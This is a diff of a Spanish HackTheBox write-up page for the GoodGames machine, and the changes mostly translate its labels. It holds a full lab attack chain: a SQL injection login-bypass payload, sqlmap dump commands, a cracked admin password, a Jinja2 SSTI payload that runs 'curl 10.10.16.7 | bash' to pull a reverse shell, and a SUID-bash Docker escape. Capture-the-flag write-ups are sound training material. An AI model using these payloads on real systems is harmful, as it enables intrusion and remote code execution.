@@ -141,7 +141,7 @@
     .val-red    { color: var(--red); }
     .val-facil  { color: #00ffcc; }
 
-    /* ATTACK PATH */
+    /* RUTA DE ATAQUE */
     .attack-path { display: flex; flex-direction: column; gap: 0; }
     .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
     .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
@@ -313,32 +313,33 @@
 <div class="cursor-ring" id="cursorRing"></div>
 
 <nav>
-  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
-  <a href="https://brandeiks.github.io/writeups/" class="nav-back">volver al portafolio</a>
-</nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <a href="../../../writeups/index.html" class="nav-back">ANÁLISIS</a>
+    <a href="../../../diccionario/index.html" class="nav-back">DICCIONARIO</a>
+  </nav>
 
 <!-- HERO -->
 <div class="writeup-hero">
   <div class="hero-grid"></div>
   <div class="hero-glow"></div>
   <div class="writeup-hero-content">
-    <p class="breadcrumb">
-      <a href="https://brandeiks.github.io/">brandeiks</a> /
-      <a href="https://brandeiks.github.io/writeups/">writeups</a> /
-      <a href="https://brandeiks.github.io/writeups/">hackthebox</a> /
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">análisis</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
       <span>goodgames</span>
-    </p>
+    </div>
     <h1 class="writeup-title"><span>GoodGames</span></h1>
-    <p class="writeup-subtitle">HackTheBox — Linux · SQLi → sqlmap → Hash Cracking → SSTI Jinja2 → Reverse Shell → Docker Escape → Root</p>
+    <p class="writeup-subtitle">HackTheBox — Linux · SQLi → sqlmap → Cracking de hashes → SSTI Jinja2 → Reverse shell → Escape de Docker → Root</p>
     <div class="writeup-meta">
       <span class="meta-badge badge-facil">● FÁCIL</span>
       <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-docker">DOCKER ESCAPE</span>
       <span class="meta-badge badge-linux">LINUX</span>
       <span class="meta-badge badge-sqli">SQL INJECTION</span>
       <span class="meta-badge badge-ssti">SSTI JINJA2</span>
-      <span class="meta-badge badge-docker">DOCKER ESCAPE</span>
       <span class="meta-badge badge-sqlmap">SQLMAP</span>
-      <span class="meta-date">📅 Mayo 2026 · By Brandeiks</span>
+      <span class="meta-date">📅 Mayo 2026 · Por Brandeiks</span>
     </div>
   </div>
 </div>
@@ -353,10 +354,10 @@
       <ul class="toc-list">
         <li><a href="#resumen">01 · Resumen</a></li>
         <li><a href="#reconocimiento">02 · Reconocimiento</a></li>
-        <li><a href="#sqli">03 · SQL Injection</a></li>
+        <li><a href="#sqli">03 · Inyección SQL</a></li>
         <li><a href="#sqlmap">04 · sqlmap & Hash</a></li>
         <li><a href="#ssti">05 · SSTI — Flask Volt</a></li>
-        <li><a href="#shell">06 · Reverse Shell</a></li>
+        <li><a href="#shell">06 · Reverse shell</a></li>
         <li><a href="#docker">07 · Escape del Docker</a></li>
         <li><a href="#flags">08 · Flags</a></li>
         <li><a href="#referencia">09 · Referencia de Comandos</a></li>
@@ -368,12 +369,12 @@
       <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-green">HackTheBox</span></div>
       <div class="info-row"><span class="info-label">OS</span><span class="info-val val-blue">Linux</span></div>
       <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-facil">Fácil</span></div>
-      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">10.129.1.192</span></div>
+      <div class="info-row"><span class="info-label">IP objetivo</span><span class="info-val" style="color:var(--text)">10.129.1.192</span></div>
       <div class="info-row"><span class="info-label">Puerto</span><span class="info-val val-yellow">80 / HTTP</span></div>
       <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
     </div>
     <div class="sidebar-box">
-      <p class="sidebar-title">// ATTACK PATH</p>
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
       <div class="attack-path">
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Nmap -sSCV</span> → puerto 80 HTTP</div></div>
         <div class="ap-line"></div>
@@ -411,7 +412,7 @@
           en un contenedor <span class="hl-blue">Docker</span>.
         </p>
         <p>
-          El ataque comienza con una <span class="hl-red">SQL Injection</span> en el formulario de
+          El ataque comienza con una <span class="hl-red">Inyección SQL</span> en el formulario de
           login que permite acceder como administrador. Luego se usa <span class="hl-cyan">sqlmap</span>
           con una request de <strong>Burp Suite</strong> para dumpear la base de datos y extraer el
           hash MD5 del administrador, que se crackea con <strong>CrackStation</strong> obteniendo la
@@ -440,7 +441,7 @@
           <tr><td>Hash cracking</td><td>CrackStation (MD5)</td><td>Password: superadministrator</td></tr>
           <tr><td>SSTI detección</td><td>{{7*7}} en campo Full Name</td><td>Resultado 49 → vulnerable Jinja2</td></tr>
           <tr><td>SSTI explotación</td><td>curl 10.10.16.7 | bash → nc</td><td>Reverse shell como root en Docker</td></tr>
-          <tr><td>Docker Escape</td><td>SSH + cp bash + chown + chmod SUID</td><td>./bash -p → root en host</td></tr>
+          <tr><td>Escape de Docker</td><td>SSH + cp bash + chown + chmod SUID</td><td>./bash -p → root en host</td></tr>
         </tbody>
       </table>
     </div>
@@ -467,7 +468,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="ping 10.129.1.192 -c 3">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PING</span>
         <div><span class="prompt">$ </span><span class="cmd">ping <span class="arg">10.129.1.192</span> <span class="flag">-c 3</span></span></div>
       </div>
@@ -497,7 +498,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 10.129.1.192 -oX goodgames.xml">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">NMAP</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p- -sSCV -n -Pn</span> <span class="flag">--min-rate=5000 --open</span> <span class="arg">10.129.1.192</span> <span class="flag">-oX</span> <span class="arg">goodgames.xml</span></span></div>
       </div>
@@ -530,7 +531,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl goodgames.xml > goodgames.html">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">XSLTPROC</span>
         <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">goodgames.xml</span> &gt; <span class="arg">goodgames.html</span></span></div>
       </div>
@@ -554,7 +555,7 @@
     <!-- SQL INJECTION -->
     <div class="section" id="sqli">
       <p class="section-label">// 03</p>
-      <h2 class="section-title">SQL Injection — Bypass de Login</h2>
+      <h2 class="section-title">Inyección SQL — Bypass de Login</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -564,7 +565,7 @@
       <div class="prose">
         <p>
           En el formulario de login se prueba el payload de
-          <span class="hl-red">SQL Injection clásico</span> en el campo de email:
+          <span class="hl-red">Inyección SQL clásico</span> en el campo de email:
           <code style="color:var(--yellow)">1' or 1=1-- -</code>.
           Este payload cierra la cadena SQL con la comilla simple, añade una condición siempre
           verdadera (<code style="color:var(--yellow)">1=1</code>) y comenta el resto de la query
@@ -574,7 +575,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="1' or 1=1-- -">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SQLi PAYLOAD</span>
         <div><span class="comment"># Campo email del formulario de login</span></div>
         <div><span class="prompt">email: </span><span class="arg">1' or 1=1-- -</span></div>
@@ -609,7 +610,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="test@gmail.com / test123">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">REGISTRO</span>
         <div><span class="comment"># Credenciales de la cuenta de prueba</span></div>
         <div><span class="prompt">email: </span><span class="arg">test@gmail.com</span></div>
@@ -655,7 +656,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sqlmap -r request.txt --dbs --batch">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SQLMAP</span>
         <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">--dbs --batch</span></span></div>
       </div>
@@ -675,7 +676,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sqlmap -r request.txt -D main --tables --batch">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SQLMAP</span>
         <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">-D</span> <span class="arg">main</span> <span class="flag">--tables --batch</span></span></div>
       </div>
@@ -696,7 +697,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sqlmap -r request.txt -D main -T user -C name,email,id,password --dump --batch">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SQLMAP</span>
         <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">-D</span> <span class="arg">main</span> <span class="flag">-T</span> <span class="arg">user</span> <span class="flag">-C</span> <span class="arg">name,email,id,password</span> <span class="flag">--dump --batch</span></span></div>
       </div>
@@ -766,7 +767,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo nano /etc/hosts">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">HOSTS</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo nano <span class="arg">/etc/hosts</span></span></div>
         <div><span class="comment"># Agregar la siguiente línea:</span></div>
@@ -788,7 +789,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="admin / superadministrator">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">FLASK VOLT</span>
         <div><span class="prompt">Username: </span><span class="arg">admin</span></div>
         <div><span class="prompt">Password: </span><span class="arg">superadministrator</span></div>
@@ -809,7 +810,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="{{7*7}}">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SSTI TEST</span>
         <div><span class="comment"># Payload de detección en campo Full Name</span></div>
         <div><span class="prompt">Full Name: </span><span class="arg">{{7*7}}</span></div>
@@ -843,7 +844,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('hostname -I').read() }}">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SSTI RCE</span>
         <div><span class="arg">{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('hostname -I').read() }}</span></div>
       </div>
@@ -865,7 +866,7 @@
     <!-- REVERSE SHELL -->
     <div class="section" id="shell">
       <p class="section-label">// 06</p>
-      <h2 class="section-title">Reverse Shell — Acceso al Contenedor</h2>
+      <h2 class="section-title">Reverse shell — Acceso al Contenedor</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -881,7 +882,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="nano index.html">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">BASH</span>
         <div><span class="prompt">$ </span><span class="cmd">nano <span class="arg">index.html</span></span></div>
         <div>&nbsp;</div>
@@ -903,7 +904,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="python3 -m http.server 80">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">HTTP SERVER</span>
         <div><span class="prompt">$ </span><span class="cmd">python3 <span class="flag">-m</span> <span class="arg">http.server 80</span></span></div>
       </div>
@@ -914,7 +915,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="nc -nlvp 443">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">NETCAT</span>
         <div><span class="prompt">$ </span><span class="cmd">nc <span class="flag">-nlvp</span> <span class="arg">443</span></span></div>
       </div>
@@ -933,7 +934,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl 10.10.16.7 | bash').read() }}">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SSTI → RCE</span>
         <div><span class="arg">{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl 10.10.16.7 | bash').read() }}</span></div>
       </div>
@@ -962,7 +963,7 @@
     <!-- DOCKER ESCAPE -->
     <div class="section" id="docker">
       <p class="section-label">// 07</p>
-      <h2 class="section-title">Docker Escape — Escalada al Host</h2>
+      <h2 class="section-title">Escape de Docker — Escalada al Host</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -980,13 +981,13 @@
       </div>
 
       <div class="cmd-block" data-cmd="script /dev/null -c bash">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">DOCKER SHELL</span>
         <div><span class="prompt">root@3a453ab39d3d:/backend# </span><span class="cmd">script <span class="arg">/dev/null</span> <span class="flag">-c bash</span></span></div>
       </div>
 
       <div class="cmd-block" data-cmd="ssh augustus@172.19.0.1">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SSH</span>
         <div><span class="prompt">root@3a453ab39d3d:/home/augustus# </span><span class="cmd">ssh <span class="arg">augustus@172.19.0.1</span></span></div>
         <div><span class="comment"># Password: superadministrator</span></div>
@@ -1024,7 +1025,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="cp /bin/bash .">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">DOCKER — ROOT</span>
         <div><span class="prompt">root@3a453ab39d3d:/home/augustus# </span><span class="cmd">cp <span class="arg">/bin/bash</span> <span class="arg">.</span></span></div>
       </div>
@@ -1045,7 +1046,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="chown root:root bash && chmod 4755 bash">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">DOCKER — ROOT</span>
         <div><span class="prompt">root@3a453ab39d3d:/home/augustus# </span><span class="cmd">chown <span class="arg">root:root bash</span></span></div>
         <div><span class="prompt">root@3a453ab39d3d:/home/augustus# </span><span class="cmd">chmod <span class="arg">4755 bash</span></span></div>
@@ -1053,8 +1054,8 @@
 
       <div class="output-block">
         <div>total 1148</div>
-        <div>-<span class="o-red">rwsr-xr-x</span> 1 root root 1168776 May 29 09:42 <span class="o-yellow">bash</span></div>
-        <div>-rw-r----- 1 root 1000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 33 May 29 03:14 user.txt</div>
+        <div>-<span class="o-red">rwsr-xr-x</span> 1 root root 1168776 Mayo 29 09:42 <span class="o-yellow">bash</span></div>
+        <div>-rw-r----- 1 root 1000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 33 Mayo 29 03:14 user.txt</div>
       </div>
 
       <div class="step-marker">
@@ -1071,7 +1072,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="./bash -p">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">HOST — AUGUSTUS</span>
         <div><span class="prompt">augustus@GoodGames:~$ </span><span class="cmd">./bash <span class="flag">-p</span></span></div>
       </div>
@@ -1098,11 +1099,11 @@
 
       <div class="step-marker">
         <div class="step-num">24</div>
-        <span class="step-title">USER FLAG — /home/augustus/user.txt</span>
+        <span class="step-title">BANDERA DE USUARIO — /home/augustus/user.txt</span>
       </div>
 
       <div class="cmd-block" data-cmd="cat /home/augustus/user.txt">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">LINUX</span>
         <div><span class="prompt">bash-5.0# </span><span class="cmd">cat <span class="arg">/home/augustus/user.txt</span></span></div>
       </div>
@@ -1113,11 +1114,11 @@
 
       <div class="step-marker">
         <div class="step-num">25</div>
-        <span class="step-title">ROOT FLAG — /root/root.txt</span>
+        <span class="step-title">BANDERA DE ROOT — /root/root.txt</span>
       </div>
 
       <div class="cmd-block" data-cmd="cat /root/root.txt">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">LINUX</span>
         <div><span class="prompt">bash-5.0# </span><span class="cmd">cat <span class="arg">/root/root.txt</span></span></div>
       </div>
@@ -1128,11 +1129,11 @@
 
       <div class="flags-grid">
         <div class="flag-card">
-          <div class="flag-label">// USER FLAG</div>
+          <div class="flag-label">// BANDERA DE USUARIO</div>
           <div class="flag-user">/home/augustus/user.txt</div>
         </div>
         <div class="flag-root-card">
-          <div class="flag-label">// ROOT FLAG</div>
+          <div class="flag-label">// BANDERA DE ROOT</div>
           <div class="flag-root">a2d96b0e549b31519ceaa3e630d34104</div>
         </div>
       </div>
@@ -1164,7 +1165,7 @@
         <div class="cmd-ref-card">
           <div class="cmd-ref-name">sqlmap</div>
           <div class="cmd-ref-syntax">sqlmap -r request.txt -D &lt;db&gt; -T &lt;tabla&gt; --dump --batch</div>
-          <div class="cmd-ref-desc">Automatiza SQL Injection usando una request HTTP guardada desde Burp Suite para extraer datos de la base de datos.</div>
+          <div class="cmd-ref-desc">Automatiza Inyección SQL usando una request HTTP guardada desde Burp Suite para extraer datos de la base de datos.</div>
           <ul class="cmd-ref-flags">
             <li><span>-r request.txt</span> → Request HTTP capturada</li>
             <li><span>--dbs</span> → Listar bases de datos</li>
@@ -1187,7 +1188,7 @@
         </div>
 
         <div class="cmd-ref-card">
-          <div class="cmd-ref-name">Docker Escape — SUID</div>
+          <div class="cmd-ref-name">Escape de Docker — SUID</div>
           <div class="cmd-ref-syntax">cp /bin/bash . → chown root:root bash → chmod 4755 bash → ./bash -p</div>
           <div class="cmd-ref-desc">Técnica de escape de Docker aprovechando un volumen compartido entre el contenedor (root) y el host (usuario normal).</div>
           <ul class="cmd-ref-flags">
@@ -1212,13 +1213,13 @@
       <div class="glosario-grid">
 
         <div class="glos-card">
-          <div class="glos-term">SQL Injection (SQLi)</div>
-          <div class="glos-def"><strong>SQL Injection</strong> es una vulnerabilidad que ocurre cuando una aplicación incorpora datos del usuario directamente en queries SQL sin sanitizarlos. Un atacante puede insertar código SQL malicioso que altera la lógica de la query original. El payload <code>1' or 1=1-- -</code> cierra la cadena de texto con la comilla simple, añade una condición siempre verdadera y comenta el resto de la query, haciendo que el servidor autentique al primer usuario de la tabla sin verificar la contraseña.</div>
+          <div class="glos-term">Inyección SQL (SQLi)</div>
+          <div class="glos-def"><strong>Inyección SQL</strong> es una vulnerabilidad que ocurre cuando una aplicación incorpora datos del usuario directamente en queries SQL sin sanitizarlos. Un atacante puede insertar código SQL malicioso que altera la lógica de la query original. El payload <code>1' or 1=1-- -</code> cierra la cadena de texto con la comilla simple, añade una condición siempre verdadera y comenta el resto de la query, haciendo que el servidor autentique al primer usuario de la tabla sin verificar la contraseña.</div>
         </div>
 
         <div class="glos-card">
           <div class="glos-term">sqlmap</div>
-          <div class="glos-def"><strong>sqlmap</strong> es una herramienta open-source que automatiza la detección y explotación de vulnerabilidades de SQL Injection. Soporta múltiples técnicas de inyección (boolean-based, time-based, error-based, UNION-based, stacked queries) y puede dumpear bases de datos completas, leer archivos del sistema, e incluso ejecutar comandos. La flag <code>-r request.txt</code> permite usar una request HTTP completa capturada con Burp Suite, incluyendo todos los headers y cookies necesarios para la autenticación.</div>
+          <div class="glos-def"><strong>sqlmap</strong> es una herramienta open-source que automatiza la detección y explotación de vulnerabilidades de Inyección SQL. Soporta múltiples técnicas de inyección (boolean-based, time-based, error-based, UNION-based, stacked queries) y puede dumpear bases de datos completas, leer archivos del sistema, e incluso ejecutar comandos. La flag <code>-r request.txt</code> permite usar una request HTTP completa capturada con Burp Suite, incluyendo todos los headers y cookies necesarios para la autenticación.</div>
         </div>
 
         <div class="glos-card">
@@ -1257,7 +1258,7 @@
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">Reverse Shell</div>
+          <div class="glos-term">Reverse shell</div>
           <div class="glos-def">Una <strong>reverse shell</strong> es una conexión donde la <em>máquina víctima</em> se conecta de vuelta hacia el <em>atacante</em>, en lugar del flujo normal. El atacante abre un listener (<code>nc -nlvp 443</code>) y cuando el exploit se ejecuta (en este caso via SSTI), la víctima establece la conexión. La técnica <code>curl IP | bash</code> permite descargar y ejecutar el payload en un solo paso sin escribir archivos en el sistema víctima primero, lo que dificulta la detección.</div>
         </div>
 
@@ -1269,9 +1270,9 @@
 
 <!-- FOOTER -->
 <footer>
-  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · HackTheBox</p>
-  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
-</footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Análisis de Goodgames · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
 
 <script>
   // ACTIVE TOC
